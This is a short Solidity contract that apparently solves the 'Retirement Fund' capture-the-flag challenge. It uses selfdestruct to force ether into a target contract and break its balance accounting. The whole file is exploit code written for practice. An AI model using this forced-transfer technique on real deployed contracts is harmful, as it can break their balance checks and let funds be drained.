// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract RetirementFundChallengeSolver {
    function transferForcibly(address payable chal) external payable {
        selfdestruct(chal);
    }
}